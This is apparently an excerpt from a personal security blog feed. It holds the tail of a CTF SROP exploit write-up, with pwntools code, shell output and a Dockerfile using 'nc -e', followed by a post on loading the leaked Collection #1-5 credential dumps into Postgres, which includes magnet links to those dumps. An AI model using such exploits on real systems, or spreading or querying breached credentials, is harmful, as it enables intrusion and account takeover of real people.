<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">Send 15 bytes to trigger SIGRETURN again, executing /bin/sh</span><span style="color:#e6db74">
</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Triggering the last SIGRETURN</span><span style="color:#e6db74">&#34;</span>)
pause(SLEEP)
p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">C</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> constants<span style="color:#f92672">.</span>SYS_rt_sigreturn)
p<span style="color:#f92672">.</span>interactive()

</code></pre></div><p>That should be all we need. When we run our final payload, we get:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ python minipwn.py local
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/terrance/Dropbox/Blogs/security/content/post/minipwn/pwn/pwn&#39;</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./pwn&#39;</span>: pid <span style="color:#ae81ff">3587974</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending initial payload to leak pointers
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> leaked stack: 0x7ffff9555000
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#ae81ff">2</span> which feeds the first SIGRETURN frame
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the first SIGRETURN by sending <span style="color:#ae81ff">15</span> junk bytes
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resetting the binary to a vulnerable read state and sending 2nd SIGRETURN execve payload
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the last SIGRETURN
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
$ whoami
terrance
$
</code></pre></div><p>Works on my machine! Well, let's test it &ldquo;remote&rdquo;. Here's the CTF's Dockerfile which will set up
the challenge for remote pwning. You can tie the binary together with netcat or socat as well.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-dockerfile" data-lang="dockerfile"><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> alpine:latest</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir /app<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> pwn /app/<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> flag.txt /app/<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod +x /app/pwn<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> adduser imth -D -s <span style="color:#66d9ef">$(</span>which nologin<span style="color:#66d9ef">)</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 1337</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">USER</span><span style="color:#e6db74"> imth</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /app/</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENTRYPOINT</span> [<span style="color:#e6db74">&#34;nc&#34;</span>, <span style="color:#e6db74">&#34;-lkvp&#34;</span>, <span style="color:#e6db74">&#34;1337&#34;</span>, <span style="color:#e6db74">&#34;-e&#34;</span>, <span style="color:#e6db74">&#34;/app/pwn&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Run with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker build -t minipwn .
docker run -p 1337:1337 --rm minipwn
</code></pre></div><p>Then test the exploit remotely:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">❯❯ python minipwn.py remote 172.17.0.1 <span style="color:#ae81ff">1337</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 172.17.0.1 on port 1337: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Run mode: remote
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 172.17.0.1 on port 1337: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Run mode: remote
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending initial payload to leak pointers
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> leaked stack: 0x7ffc178a6000
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#ae81ff">2</span> which feeds the first SIGRETURN frame
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the first SIGRETURN by sending <span style="color:#ae81ff">15</span> junk bytes
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Resetting the binary to a vulnerable read state and sending 2nd SIGRETURN execve payload
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Triggering the last SIGRETURN
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Waiting: Done
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>imth<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>imth<span style="color:#f92672">)</span>
$ cat flag.txt
TMHC<span style="color:#f92672">{</span>h4v3_y0u_h34rd_0f_SROP<span style="color:#f92672">}</span>
$
</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Hopefully that was clear. I know I'll be referring back to this when I run into a similar problem
again during a CTF. I've provided the challenge binary, commented exploit script, Dockerfile, and
flag file in an archive <a href="minipwn.tar.gz">here</a></p>
<p>The official binaries, write-up and solution script using Mprotect can be found here
<a href="https://github.com/TheManyHatsClub-CTF/TheManyHatsClubCTF/tree/master/2019/pwn/miniPWN">https://github.com/TheManyHatsClub-CTF/TheManyHatsClubCTF/tree/master/2019/pwn/miniPWN</a></p>
<p>If you see any errors or have suggestions on better ways to explain something in the post, please
let me know. This was a learning experience for me as well as an attempt to share newly acquired
knowledge.</p>
]]></content>
        </item>
        
        <item>
            <title>Password Dump Database - Part 1</title>
            <link>https://sec.alexflor.es/posts/2019/09/password-dump-database-part-1/</link>
            <pubDate>Sat, 28 Sep 2019 19:33:14 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2019/09/password-dump-database-part-1/</guid>
            <description>Preface This post is first in a series where I mostly catalogue my failures, what didn&#39;t work, and the lessons I learned along the way. This isn&#39;t a tool drop, or a new dump. Also, part 2 basically says every choice I make in Part 1 (this part) is wrong. If you&#39;re a DB admin or have experience with manipulating large amounts of data, prepare to cringe&amp;hellip; HARD
If you&#39;re just interested in some stats and bencharks, you can skip straight to that section</description>
            <content type="html"><![CDATA[<h2 id="preface">Preface</h2>
<p>This post is first in a series where I mostly catalogue my failures, what didn't work, and the
lessons I learned along the way. This isn't a tool drop, or a new dump. Also, part 2 basically
says every choice I make in Part 1 (this part) is wrong. If you're a DB admin or have experience
with manipulating large amounts of data, prepare to cringe&hellip; HARD</p>
<p>If you're just interested in some stats and bencharks, you can
<a href="#benchmarks-and-data">skip straight to that section</a></p>
<p>If you'd like to play along, here are some magnet links to the dumps.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt"># Collection #1
magnet:?xt=urn:btih:b39c603c7e18db8262067c5926e7d5ea5d20e12e&amp;dn=Collection+1

# Collections #2 - #5
magnet:?xt=urn:btih:d136b1adde531f38311fbf43fb96fc26df1a34cd&amp;dn=Collection+%232-%235+%26+Antipublic
</code></pre></div><h2 id="why">Why?</h2>
<p><img src="demo.gif" alt=""></p>
<p>How much data duplication is there in the public database dumps, Collection #1-#5?</p>
<p>How much space is taken by duplicate passwords and email domains like gmail.com?</p>
<p>During a <a href="https://www.youtube.com/watch?v=f84n5oFoZBc">Hammock-Driven Development</a> session,
thinking about how to answer this question, I found myself with the additional desire of searching
through the Collections without needing to <code>zgrep</code> my way through. I also didn't accept grepping
through terrabytes of unzipped data as a solution. When I think data normalization, and quick
searching we all think: DATABASES!</p>
<h2 id="planning-it">Planning it</h2>
<p>This dataset is huge. Querying will be 99% percent of this database's purpose. We want fast search
results. We can decide, then,  to incur the costs of writing to a heavily-indexed database up
front, while seeding the databse. Let's get <em>normalized</em>.</p>
<p>The records in these types of dumps are generally structured like so:</p>
<pre><code>username@domain.com:P@ssw0rd!
</code></pre><p>Let's start by splitting each record into tables <code>usernames</code>, <code>domains</code>, and <code>passwords</code>.
We can also create a <code>records</code> table with foreign keys which will maintain the relationship between
entires in the other 3 tables. Also, if we create a unique index on the combination of the foreign
keys in the <code>records</code> table, we ensure that only one combination of <code>user</code>, <code>domain</code>, and
<code>password</code> ever enters the <code>records</code> table.  If there are 900 million gmail.com addresses in the
dumps, the string &ldquo;gmail.com&rdquo; is only stored once. This kind of data normalization is what
databases are meant for.</p>
<p>With this configuration, if we seed our database with the following records:</p>
<pre><code>jerry@gmail.com:Summer19
adam@gmail.com: Summer19
samantha@yahoo.com:Summer19
samantha@yandex.ru:Password123
</code></pre><p>our tables will look like this:</p>
<h4 id="usernames">Usernames</h4>
<table>
<thead>
<tr>
<th>id</th>
<th>usernames</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>jerry</td>
</tr>
<tr>
<td>2</td>
<td>adam</td>
</tr>
<tr>
<td>3</td>
<td>samantha</td>
</tr>
</tbody>
</table>
<h4 id="passwords">Passwords</h4>
<table>
<thead>
<tr>
<th>id</th>
<th>password</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Summer19</td>
</tr>
<tr>
<td>2</td>
<td>Password123</td>
</tr>
</tbody>
</table>
<h4 id="domains">Domains</h4>
<table>
<thead>
<tr>
<th>id</th>
<th>domain</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>gmail.com</td>
</tr>
<tr>
<td>2</td>
<td>yahoo.com</td>
</tr>
<tr>
<td>3</td>
<td>yandex.ru</td>
</tr>
</tbody>
</table>
<h4 id="records">Records</h4>
<table>
<thead>
<tr>
<th>username_id</th>
<th>domain_id</th>
<th>password_id</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>1</td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td>2</td>
</tr>
</tbody>
</table>
<p>With this normalization, we've taken 109 bytes of dump data and normalized it down to 64 bytes of
uniqued data, plus the size of the join table that maintains the previous relationships.</p>
<p>Also, with <code>records</code> serving as a <code>JOIN</code> table between the other 3 tables, we can create some
interesting queries.</p>
<ul>
<li>Who are all the users that use <code>P@$$w0rd1</code> for a password?</li>
<li>What's the most common password by users from company <code>contoso.com</code>?</li>
<li>At which other domains does a particular user receive email?
<ul>
<li>Did they use the same password on other sites whose creds were also dumped?</li>
</ul>
</li>
</ul>
<h2 id="building-it">Building it</h2>
<p>I really enjoy using the ORM, ActiveRecord. ORMs are Object Relational Mappers. They're a layer of
abstraction over databases that exists across most programming languages. They take that language's
concept of a struct/class/object and map its properties to a database table. For example, if we
have a <code>Dog</code> class in our language, an ORM maps this class to a <code>dogs</code> table in our database. Once
we create an instance of that dog class, <code>starbuck = Dog.new</code>, <code>starbuck</code> now represents a single
row in the <code>dogs</code> table. Columns, then, are mapped to properties of an instance.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">starbuck <span style="color:#f92672">=</span> <span style="color:#66d9ef">Dog</span><span style="color:#f92672">.</span>create(name: <span style="color:#e6db74">&#39;Starbuck&#39;</span>)
<span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">Dog</span><span style="color:#f92672">&lt;</span>id: <span style="color:#ae81ff">1</span><span style="color:#f92672"></span>, name: <span style="color:#e6db74">&#39;Starbuck&#39;</span><span style="color:#f92672">&gt;</span>

starbuck<span style="color:#f92672">.</span>name
<span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Starbuck</span><span style="color:#e6db74">&#34;</span>
</code></pre></div><p>When calling <code>starbuck.name</code>, the ORM's query planner will generate and issue the following query to
the underlying SQL engine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> name 
<span style="color:#66d9ef">FROM</span> dogs
<span style="color:#66d9ef">WHERE</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">id</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>

<span style="color:#f92672">=</span><span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Starbuck</span><span style="color:#e6db74">&#34;</span>
</code></pre></div><p>Another beneficial feature of an ORM is that it can be configured for many different SQL dialects.
The ORM affords us another abstraction by allowing users to configure different database engines in
the ORM's initial configuration. We could, for example, conditionally use a SQLite3 file for
running tests locally during development, but use Postgres in production.  All without changing a
line of business logic.</p>
<p>Another reason I chose ActiveRecord was its ease of configuration. The following blocks of code
are all that's needed to enable queries that can ordinarily be cumbersome to write.</p>
<h3 id="configuring-data-models">Configuring data models</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Password</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span>
  has_many <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:usernames</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:domains</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
<span style="color:#66d9ef">end</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Domain</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span>
  has_many <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:passwords</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:usernames</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
<span style="color:#66d9ef">end</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Username</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span>
  has_many <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:passwords</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
  has_many <span style="color:#e6db74">:domains</span>, <span style="color:#e6db74">through</span>: <span style="color:#e6db74">:records</span>
<span style="color:#66d9ef">end</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Record</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span>
  belongs_to <span style="color:#e6db74">:domain</span>
  belongs_to <span style="color:#e6db74">:password</span>
  belongs_to <span style="color:#e6db74">:username</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><h3 id="configuring-the-database-driver">Configuring the Database Driver</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>

<span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Base</span><span style="color:#f92672">.</span>establish_connection( 
 <span style="color:#e6db74">host</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">localhost</span><span style="color:#e6db74">&#34;</span>,
 <span style="color:#e6db74">database</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">passdb</span><span style="color:#e6db74">&#34;</span>,
 <span style="color:#e6db74">username</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">postgres</span><span style="color:#e6db74">&#34;</span>,
 <span style="color:#e6db74">password</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">postgres</span><span style="color:#e6db74">&#34;</span>,
 <span style="color:#e6db74">adapter</span>: <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">postgresql</span><span style="color:#e6db74">&#34;</span>
)
</code></pre></div><h3 id="configuring-the-database-schema">Configuring the Database Schema</h3>
<p>The following are the schema migrations that will create the correct tables and indices in our
database, as well as set the constraints necessary to keep our data clean:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">require <span style="color:#e6db74">&#39;active_record&#39;</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AddRecords</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Migration</span><span style="color:#f92672">[</span><span style="color:#ae81ff">5</span><span style="color:#f92672"></span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672"></span><span style="color:#f92672">]</span>
  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">.</span><span style="color:#a6e22e">up</span>
    create_table <span style="color:#e6db74">:records</span>, <span style="color:#e6db74">unlogged</span>: <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>t<span style="color:#f92672">|</span>
      t<span style="color:#f92672">.</span>references <span style="color:#e6db74">:password</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
      t<span style="color:#f92672">.</span>references <span style="color:#e6db74">:domain</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
      t<span style="color:#f92672">.</span>references <span style="color:#e6db74">:username</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
    <span style="color:#66d9ef">end</span>

    <span style="color:#75715e">## This will create a uniquness check on the combination of a user, password, domain</span>
    add_index <span style="color:#e6db74">:records</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">:password_id</span>, <span style="color:#e6db74">:domain_id</span>, <span style="color:#e6db74">:username_id</span><span style="color:#f92672">]</span>, <span style="color:#e6db74">unique</span>: <span style="color:#66d9ef">true</span>


    <span style="color:#75715e">### These are just query optimization indices</span>
    add_index <span style="color:#e6db74">:records</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">:username_id</span>, <span style="color:#e6db74">:domain_id</span><span style="color:#f92672">]</span>
    add_index <span style="color:#e6db74">:records</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">:username_id</span>, <span style="color:#e6db74">:password_id</span><span style="color:#f92672">]</span>
  <span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>


<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AddPasswords</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Migration</span><span style="color:#f92672">[</span><span style="color:#ae81ff">5</span><span style="color:#f92672"></span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672"></span><span style="color:#f92672">]</span>
  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">.</span><span style="color:#a6e22e">up</span>
    create_table <span style="color:#e6db74">:passwords</span>, <span style="color:#e6db74">unlogged</span>: <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>t<span style="color:#f92672">|</span>
      t<span style="color:#f92672">.</span>string <span style="color:#e6db74">:password</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
    <span style="color:#66d9ef">end</span>

    <span style="color:#75715e"># only allow one instance of any given password</span>
    add_index <span style="color:#e6db74">:passwords</span>, <span style="color:#e6db74">:password</span>, <span style="color:#e6db74">unique</span>: <span style="color:#66d9ef">true</span>
  <span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>


<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AddUsernames</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Migration</span><span style="color:#f92672">[</span><span style="color:#ae81ff">5</span><span style="color:#f92672"></span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672"></span><span style="color:#f92672">]</span>
  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">.</span><span style="color:#a6e22e">up</span>
    create_table <span style="color:#e6db74">:usernames</span>, <span style="color:#e6db74">unlogged</span>: <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>t<span style="color:#f92672">|</span>
      t<span style="color:#f92672">.</span>string <span style="color:#e6db74">:name</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
    <span style="color:#66d9ef">end</span>

    <span style="color:#75715e"># only allow one instance of any given username</span>
    add_index <span style="color:#e6db74">:usernames</span>, <span style="color:#e6db74">:name</span>, <span style="color:#e6db74">unique</span>: <span style="color:#66d9ef">true</span>

<span style="color:#66d9ef">end</span>


<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AddDomains</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ActiveRecord</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Migration</span><span style="color:#f92672">[</span><span style="color:#ae81ff">5</span><span style="color:#f92672"></span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672"></span><span style="color:#f92672">]</span>
  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">self</span><span style="color:#f92672">.</span><span style="color:#a6e22e">up</span>
    create_table <span style="color:#e6db74">:domains</span>, <span style="color:#e6db74">unlogged</span>: <span style="color:#66d9ef">true</span> <span style="color:#66d9ef">do</span> <span style="color:#f92672">|</span>t<span style="color:#f92672">|</span>
      t<span style="color:#f92672">.</span>string <span style="color:#e6db74">:domain</span>, <span style="color:#e6db74">null</span>: <span style="color:#66d9ef">false</span>
    <span style="color:#66d9ef">end</span>

    <span style="color:#75715e"># only allow one instance of any given domain</span>
    add_index <span style="color:#e6db74">:domains</span>, <span style="color:#e6db74">:domain</span>, <span style="color:#e6db74">unique</span>: <span style="color:#66d9ef">true</span>
  <span style="color:#66d9ef">end</span>
<span style="color:#66d9ef">end</span>
</code></pre></div><h2 id="seeding-the-database">Seeding the Database</h2>
<p>Collections #1-5 are huge. And they also include tons of duplicate records. By setting the correct
indices and database constraints, we can offload the task of knowing what is &ldquo;good&rdquo; vs &ldquo;bad&rdquo; data
to the database itself, instead of worrying about that in code. I initially handled this logic in
the code that seeds the database.</p>
<blockquote>
<p><strong>Dev Tangent</strong>: Software validation was a bad idea for a couple of reasons. There are no
assurances that the data in our database is clean. Especially when there are multiple threads, all
trying to write at the same time. Initially I just had a single-threaded seeding program. ETA was
about a year. During a multithread refactor, I ran into some concurrency problems. It was then
that I moved validation to the database. ETA dove down to 90 days.</p>
</blockquote>
<p>With the ORM configured, we can begin the seeding process.</p>
<p>In order to create a <code>record</code>, we need 3 other pre-existing row ids: user_id, password_id, and
domain_id.  Sometimes, we encounter a line in the dump data that has all new data. Other times,
maybe only the username and password is new. Upon trying to create a new <code>gmail.com</code> domain record,
we'll get a failure because it doesn't meet our uniquness constraint. In this scenario, we can
instead ask for the <code>id</code> of the existing <code>gmail.com</code> entry in our <code>domains</code> table. With
our 3 ids, we can now use them as foreign keys for a new <code>record</code> entry.</p>
<p>You may already see a drawback in our implementation here. In a worst case scenario, where we're
trying to insert a fully duplicate record, that means we can have 7 queries to attempt to write 1
record. That might be acceptable when seeding some datasets, but with a record count in the
billions, that means a 45-day difference of seed time. Also keep in mind that each write to the
database is actually 2 writes, because the indices of each record also need to be updated.  However,
we decided early on to take this hit, since this isn't going to be write-heavy database.  We could
still help the seed times by leveraging Database Transactions and Postgres&rsquo; <code>ON CONFLICT</code> keyword
though.</p>
<p>Grouping 7 different transactions into one will ensure that all operations required for adding a
new dump entry to our tables occur together.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">BEGIN</span> 

<span style="color:#66d9ef">WITH</span> ins1 <span style="color:#66d9ef">AS</span> (
        <span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> usernames(name) <span style="color:#66d9ef">VALUES</span> (<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">1</span>)
        <span style="color:#66d9ef">ON</span> CONFLICT (name) <span style="color:#66d9ef">DO</span> <span style="color:#66d9ef">UPDATE</span> <span style="color:#66d9ef">SET</span> name<span style="color:#f92672">=</span>EXCLUDED.name
        RETURNING id <span style="color:#66d9ef">AS</span> user_id
)
, ins2 <span style="color:#66d9ef">AS</span> (
        <span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> passwords(password) <span style="color:#66d9ef">VALUES</span> (<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>)
        <span style="color:#66d9ef">ON</span> CONFLICT (password) <span style="color:#66d9ef">DO</span> <span style="color:#66d9ef">UPDATE</span> <span style="color:#66d9ef">SET</span> password<span style="color:#f92672">=</span>EXCLUDED.password
        RETURNING id <span style="color:#66d9ef">AS</span> pass_id
)
, ins3 <span style="color:#66d9ef">AS</span> (
        <span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> domains(<span style="color:#66d9ef">domain</span>) <span style="color:#66d9ef">VALUES</span> (<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span>)
        <span style="color:#66d9ef">ON</span> CONFLICT (<span style="color:#66d9ef">domain</span>) <span style="color:#66d9ef">DO</span> <span style="color:#66d9ef">UPDATE</span> <span style="color:#66d9ef">SET</span> <span style="color:#66d9ef">domain</span><span style="color:#f92672">=</span>EXCLUDED.<span style="color:#66d9ef">domain</span>
        RETURNING id <span style="color:#66d9ef">AS</span> domain_id
)

<span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> records (username_id, password_id, domain_id)
<span style="color:#66d9ef">VALUES</span> (
        (<span style="color:#66d9ef">select</span> user_id <span style="color:#66d9ef">from</span> ins1), 
        (<span style="color:#66d9ef">select</span> pass_id <span style="color:#66d9ef">from</span> ins2), 
        (<span style="color:#66d9ef">select</span> domain_id <span style="color:#66d9ef">from</span> ins3) 
)

<span style="color:#66d9ef">COMMIT</span>
</code></pre></div><p>Now, I wrote this, and it's still intimidating. From the top, we try to create each item but give
the query a sort of <code>catch</code> statement that says &ldquo;if you're unable to save, then get the id of the
entry that matches the data I just tried to insert. Then, save that id as a variable for later
use&rdquo;. In the <code>INSERT</code> statement, we create a new <code>record</code> with the IDs we stored in the 3 variables
from the 3 previous blocks. Because this is all wrapped in a Transaction, it gets sent to the
database as 1 transaction, not 7.</p>
<p>Another benefit of a transaction, is that in case of any sort of unrecoverable failure, the entire
thing get's undone. If our seeder panics while trying to write a <code>domain</code>, the previous <code>password</code>,
and <code>username</code> entries are removed from the database (they actually never wrote), ensuring we don't
have any dangling data in our database.</p>
